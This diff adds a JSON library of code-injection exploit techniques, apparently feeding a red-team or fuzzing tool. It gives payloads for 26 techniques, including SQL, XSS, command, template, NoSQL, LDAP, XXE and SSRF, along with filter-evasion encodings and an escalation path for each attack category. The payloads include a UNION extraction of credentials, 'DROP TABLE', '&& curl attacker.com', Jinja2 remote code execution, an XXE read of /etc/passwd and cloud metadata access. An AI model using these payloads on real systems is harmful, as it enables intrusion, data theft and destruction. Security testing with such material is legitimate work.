@@ -1,0 +1,437 @@
+{
+  "injection_principles": [
+    {
+      "name": "basic_payload",
+      "category": "foundational",
+      "description": "Start with a basic, straightforward injection payload without obfuscation or evasion techniques.",
+      "examples": [
+        "SQL: ' OR '1'='1",
+        "XSS: <script>alert('XSS')</script>",
+        "Command: ; ls -la"
+      ],
+      "effectiveness": "Low to Medium - often caught by basic filters"
+    },
+    {
+      "name": "comment_injection",
+      "category": "evasion",
+      "description": "Use comment syntax to break up or terminate parts of the injection, bypassing filters that look for complete patterns.",
+      "examples": [
+        "SQL: ' OR '1'='1' --",
+        "SQL: ' UNION /*comment*/ SELECT",
+        "XSS: <script>/**/alert(1)</script>"
+      ],
+      "effectiveness": "Medium - bypasses simple pattern matching"
+    },
+    {
+      "name": "encoding_obfuscation",
+      "category": "evasion",
+      "description": "Encode payloads using URL encoding, hex encoding, Base64, or other encoding schemes to evade detection.",
+      "examples": [
+        "URL: %27%20OR%20%271%27%3D%271",
+        "Hex: 0x73656c656374",
+        "Unicode: \\u003cscript\\u003e"
+      ],
+      "effectiveness": "Medium to High - bypasses signature-based filters"
+    },
+    {
+      "name": "case_manipulation",
+      "category": "evasion",
+      "description": "Vary the case of keywords and commands to bypass case-sensitive filters while maintaining functionality.",
+      "examples": [
+        "SQL: ' oR '1'='1",
+        "SQL: SeLeCt * FrOm users",
+        "XSS: <ScRiPt>alert(1)</ScRiPt>"
+      ],
+      "effectiveness": "Low to Medium - defeats basic case-sensitive filters"
+    },
+    {
+      "name": "whitespace_manipulation",
+      "category": "evasion",
+      "description": "Insert unusual whitespace characters (tabs, newlines, multiple spaces) to break pattern matching.",
+      "examples": [
+        "SQL: '   OR   '1'='1",
+        "SQL: UNION\\nSELECT",
+        "Command: ;\\ncat\\t/etc/passwd"
+      ],
+      "effectiveness": "Medium - bypasses regex-based filters"
+    },
+    {
+      "name": "nested_encoding",
+      "category": "advanced_evasion",
+      "description": "Apply multiple layers of encoding to defeat recursive decoding or single-pass filters.",
+      "examples": [
+        "Double URL encoding: %2527%20OR%20%25271%2527%253D%25271",
+        "Base64 of hex encoding",
+        "HTML entities of unicode"
+      ],
+      "effectiveness": "High - defeats multi-layer filtering"
+    },
+    {
+      "name": "null_byte_injection",
+      "category": "advanced_evasion",
+      "description": "Insert null bytes (%00 or \\x00) to truncate strings or bypass filters in certain contexts.",
+      "examples": [
+        "SQL: admin'%00--",
+        "Path: ../../etc/passwd%00.jpg",
+        "XSS: <script%00>alert(1)</script>"
+      ],
+      "effectiveness": "Medium - works in specific language/framework contexts"
+    },
+    {
+      "name": "time_based_escalation",
+      "category": "technique_variation",
+      "description": "For SQL injection, use time-based blind techniques to infer data through observable delays.",
+      "examples": [
+        "SQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--",
+        "SQL: ' AND SLEEP(5)--",
+        "SQL: '; BENCHMARK(5000000,MD5('A'))--"
+      ],
+      "effectiveness": "High - works even when error messages are suppressed"
+    },
+    {
+      "name": "union_based_escalation",
+      "category": "technique_variation",
+      "description": "Use UNION-based SQL injection to extract data from other tables or columns.",
+      "examples": [
+        "SQL: ' UNION SELECT null, username, password FROM users--",
+        "SQL: ' UNION ALL SELECT 1,2,3,4--",
+        "SQL: ' UNION SELECT table_name FROM information_schema.tables--"
+      ],
+      "effectiveness": "High - allows direct data extraction"
+    },
+    {
+      "name": "stacked_queries",
+      "category": "escalation",
+      "description": "Execute multiple SQL statements in a single injection by stacking queries with semicolons.",
+      "examples": [
+        "SQL: '; DROP TABLE users--",
+        "SQL: '; INSERT INTO admins VALUES ('hacker', 'pass')--",
+        "SQL: '; UPDATE users SET role='admin' WHERE id=1--"
+      ],
+      "effectiveness": "Very High - allows full database manipulation (if supported)"
+    },
+    {
+      "name": "polyglot_injection",
+      "category": "advanced",
+      "description": "Create payloads that work across multiple contexts (SQL, JavaScript, HTML) simultaneously.",
+      "examples": [
+        "Mixed: '/**/OR/**/1=1--<script>alert(1)</script>",
+        "Universal: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+      ],
+      "effectiveness": "Very High - bypasses context-specific filters"
+    },
+    {
+      "name": "dom_based_xss",
+      "category": "xss_specific",
+      "description": "Exploit client-side JavaScript that processes user input without proper sanitization.",
+      "examples": [
+        "XSS: #<img src=x onerror=alert(1)>",
+        "XSS: javascript:alert(document.cookie)",
+        "XSS: data:text/html,<script>alert(1)</script>"
+      ],
+      "effectiveness": "High - bypasses server-side filters entirely"
+    },
+    {
+      "name": "prototype_pollution",
+      "category": "advanced",
+      "description": "Manipulate JavaScript object prototypes to inject malicious properties or functions.",
+      "examples": [
+        "JSON: {\"__proto__\": {\"isAdmin\": true}}",
+        "URL: ?__proto__[isAdmin]=true",
+        "Object: constructor.prototype.isAdmin=true"
+      ],
+      "effectiveness": "Very High - can achieve RCE in Node.js contexts"
+    },
+    {
+      "name": "command_chaining",
+      "category": "command_injection",
+      "description": "Chain multiple system commands using shell metacharacters to execute arbitrary commands.",
+      "examples": [
+        "Shell: ; whoami",
+        "Shell: | cat /etc/passwd",
+        "Shell: && curl attacker.com",
+        "Shell: `id`"
+      ],
+      "effectiveness": "Very High - full command execution"
+    },
+    {
+      "name": "environment_variable_manipulation",
+      "category": "command_injection",
+      "description": "Manipulate environment variables to alter command behavior or inject malicious paths.",
+      "examples": [
+        "Shell: export PATH=/tmp:$PATH; ls",
+        "Shell: IFS=';' cat /etc/passwd",
+        "Shell: LD_PRELOAD=/tmp/evil.so ls"
+      ],
+      "effectiveness": "High - can achieve privilege escalation"
+    },
+    {
+      "name": "template_injection",
+      "category": "ssti",
+      "description": "Inject code into server-side template engines (Jinja2, Twig, Freemarker) to achieve RCE.",
+      "examples": [
+        "Jinja2: {{7*7}}",
+        "Jinja2: {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+        "Twig: {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
+      ],
+      "effectiveness": "Very High - often leads to RCE"
+    },
+    {
+      "name": "nosql_injection",
+      "category": "nosql_specific",
+      "description": "Exploit NoSQL databases (MongoDB, CouchDB) through object injection or operator abuse.",
+      "examples": [
+        "MongoDB: {\"$ne\": null}",
+        "MongoDB: {\"$gt\": \"\"}",
+        "MongoDB: {\"$where\": \"this.password.match(/.*/)\"}"
+      ],
+      "effectiveness": "High - bypasses traditional SQL injection defenses"
+    },
+    {
+      "name": "ldap_injection",
+      "category": "ldap_specific",
+      "description": "Inject LDAP filter metacharacters to bypass authentication or extract directory information.",
+      "examples": [
+        "LDAP: *)(uid=*))(|(uid=*",
+        "LDAP: admin)(&(password=*)",
+        "LDAP: *)(objectClass=*"
+      ],
+      "effectiveness": "Medium to High - works against LDAP-based auth"
+    },
+    {
+      "name": "xpath_injection",
+      "category": "xpath_specific",
+      "description": "Inject XPath expressions to manipulate XML queries and extract data.",
+      "examples": [
+        "XPath: ' or '1'='1",
+        "XPath: '] | //user/* | a[' ",
+        "XPath: 'or 1=1 or ''='"
+      ],
+      "effectiveness": "Medium - specific to XML-based applications"
+    },
+    {
+      "name": "xxe_injection",
+      "category": "xml_specific",
+      "description": "Exploit XML External Entity processing to read files, perform SSRF, or cause DoS.",
+      "examples": [
+        "XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+        "XXE: <!ENTITY xxe SYSTEM \"http://attacker.com/\">",
+        "XXE (billion laughs): <!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;...\">"
+      ],
+      "effectiveness": "Very High - can read sensitive files"
+    },
+    {
+      "name": "deserialization_injection",
+      "category": "advanced",
+      "description": "Inject malicious serialized objects to achieve RCE during deserialization.",
+      "examples": [
+        "Java: ysoserial payload",
+        "Python: pickle exploit",
+        "PHP: unserialize() exploit"
+      ],
+      "effectiveness": "Very High - often achieves RCE"
+    },
+    {
+      "name": "header_injection",
+      "category": "http_specific",
+      "description": "Inject malicious content into HTTP headers to perform HTTP response splitting or cache poisoning.",
+      "examples": [
+        "CRLF: \\r\\nSet-Cookie: admin=true",
+        "CRLF: \\r\\n\\r\\n<script>alert(1)</script>",
+        "Host header: evil.com"
+      ],
+      "effectiveness": "Medium to High - depends on application processing"
+    },
+    {
+      "name": "ssrf_injection",
+      "category": "ssrf_specific",
+      "description": "Manipulate server-side requests to access internal resources or perform port scanning.",
+      "examples": [
+        "SSRF: http://localhost:6379/",
+        "SSRF: http://169.254.169.254/latest/meta-data/",
+        "SSRF: file:///etc/passwd"
+      ],
+      "effectiveness": "Very High - can access internal network"
+    },
+    {
+      "name": "crlf_injection",
+      "category": "http_specific",
+      "description": "Inject Carriage Return and Line Feed characters to manipulate HTTP responses or logs.",
+      "examples": [
+        "Log injection: \\r\\nINFO: Admin login successful",
+        "Response splitting: \\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK"
+      ],
+      "effectiveness": "Medium - useful for log forgery and response manipulation"
+    },
+    {
+      "name": "mutation_fuzzing",
+      "category": "escalation",
+      "description": "Systematically mutate successful payloads to find variations that bypass specific filters.",
+      "examples": [
+        "Add random spaces: ' O R '1'='1",
+        "Mix encodings: %27 OR <hex>31</hex>='1",
+        "Substitute equivalents: LIKE instead of =, CONCAT instead of ||"
+      ],
+      "effectiveness": "Medium to High - finds filter edge cases"
+    },
+    {
+      "name": "context_switching",
+      "category": "escalation",
+      "description": "Break out of current context (string, quote, tag) to inject code in a different execution context.",
+      "examples": [
+        "String breakout: '; DROP TABLE users--",
+        "HTML breakout: \"></input><script>alert(1)</script>",
+        "JSON breakout: \", \"isAdmin\": true, \"dummy\": \""
+      ],
+      "effectiveness": "High - exploits parsing boundaries"
+    }
+  ],
+  "categories": {
+    "sql_injection": {
+      "name": "SQL Injection",
+      "description": "Inject malicious SQL code to manipulate database queries, extract data, or execute unauthorized commands.",
+      "primary_principles": ["basic_payload", "comment_injection", "union_based_escalation", "stacked_queries", "time_based_escalation"],
+      "escalation_path": [
+        "basic_payload",
+        "comment_injection",
+        "case_manipulation",
+        "encoding_obfuscation",
+        "union_based_escalation",
+        "time_based_escalation",
+        "stacked_queries",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["Web applications with database backends", "API endpoints", "Login forms", "Search functions"]
+    },
+    "xss": {
+      "name": "Cross-Site Scripting (XSS)",
+      "description": "Inject malicious JavaScript to execute in victim browsers, steal credentials, or perform actions on behalf of users.",
+      "primary_principles": ["basic_payload", "encoding_obfuscation", "dom_based_xss", "polyglot_injection"],
+      "escalation_path": [
+        "basic_payload",
+        "case_manipulation",
+        "encoding_obfuscation",
+        "nested_encoding",
+        "dom_based_xss",
+        "polyglot_injection",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["User input fields", "URL parameters", "DOM manipulation", "Rich text editors"]
+    },
+    "command_injection": {
+      "name": "Command Injection",
+      "description": "Execute arbitrary system commands on the server through vulnerable input processing.",
+      "primary_principles": ["basic_payload", "command_chaining", "environment_variable_manipulation"],
+      "escalation_path": [
+        "basic_payload",
+        "command_chaining",
+        "encoding_obfuscation",
+        "whitespace_manipulation",
+        "environment_variable_manipulation",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["File upload handlers", "System utilities", "Subprocess calls", "Shell commands"]
+    },
+    "ssti": {
+      "name": "Server-Side Template Injection",
+      "description": "Inject code into template engines to achieve remote code execution on the server.",
+      "primary_principles": ["template_injection", "context_switching", "encoding_obfuscation"],
+      "escalation_path": [
+        "template_injection",
+        "encoding_obfuscation",
+        "nested_encoding",
+        "context_switching",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["Template rendering", "Email templates", "PDF generation", "Report generation"]
+    },
+    "nosql_injection": {
+      "name": "NoSQL Injection",
+      "description": "Exploit NoSQL databases through operator injection or object manipulation.",
+      "primary_principles": ["nosql_injection", "context_switching", "encoding_obfuscation"],
+      "escalation_path": [
+        "basic_payload",
+        "nosql_injection",
+        "encoding_obfuscation",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["MongoDB queries", "CouchDB", "Redis", "ElasticSearch"]
+    },
+    "ldap_injection": {
+      "name": "LDAP Injection",
+      "description": "Manipulate LDAP queries to bypass authentication or extract directory information.",
+      "primary_principles": ["ldap_injection", "encoding_obfuscation"],
+      "escalation_path": [
+        "basic_payload",
+        "ldap_injection",
+        "encoding_obfuscation",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["LDAP authentication", "Directory services", "Active Directory queries"]
+    },
+    "xxe": {
+      "name": "XML External Entity (XXE)",
+      "description": "Exploit XML parsers to read files, perform SSRF, or cause denial of service.",
+      "primary_principles": ["xxe_injection", "encoding_obfuscation"],
+      "escalation_path": [
+        "xxe_injection",
+        "encoding_obfuscation",
+        "nested_encoding"
+      ],
+      "target_contexts": ["XML parsers", "SOAP APIs", "SVG upload", "Office document processing"]
+    },
+    "deserialization": {
+      "name": "Deserialization Attack",
+      "description": "Inject malicious serialized objects to achieve code execution during deserialization.",
+      "primary_principles": ["deserialization_injection", "encoding_obfuscation"],
+      "escalation_path": [
+        "deserialization_injection",
+        "encoding_obfuscation",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["Java applications", "Python pickle", "PHP unserialize", "Session handling"]
+    },
+    "ssrf": {
+      "name": "Server-Side Request Forgery",
+      "description": "Manipulate server-side requests to access internal resources or perform port scanning.",
+      "primary_principles": ["ssrf_injection", "encoding_obfuscation"],
+      "escalation_path": [
+        "ssrf_injection",
+        "encoding_obfuscation",
+        "nested_encoding",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["URL fetching", "Webhook handlers", "Image processing", "PDF generators"]
+    },
+    "prototype_pollution": {
+      "name": "Prototype Pollution",
+      "description": "Manipulate JavaScript object prototypes to inject malicious properties or achieve RCE.",
+      "primary_principles": ["prototype_pollution", "context_switching"],
+      "escalation_path": [
+        "prototype_pollution",
+        "encoding_obfuscation",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["Node.js applications", "JSON parsers", "Object merging", "Query parameter processing"]
+    },
+    "header_injection": {
+      "name": "HTTP Header Injection",
+      "description": "Inject malicious content into HTTP headers to perform response splitting or cache poisoning.",
+      "primary_principles": ["header_injection", "crlf_injection"],
+      "escalation_path": [
+        "header_injection",
+        "crlf_injection",
+        "encoding_obfuscation",
+        "mutation_fuzzing"
+      ],
+      "target_contexts": ["HTTP response headers", "Redirect handlers", "Cookie setting", "Logging systems"]
+    }
+  },
+  "metadata": {
+    "version": "1.0",
+    "last_updated": "2025-11-15",
+    "total_principles": 26,
+    "total_categories": 11,
+    "description": "Comprehensive library of code injection exploit principles organized by attack category with escalation paths."
+  }
+}
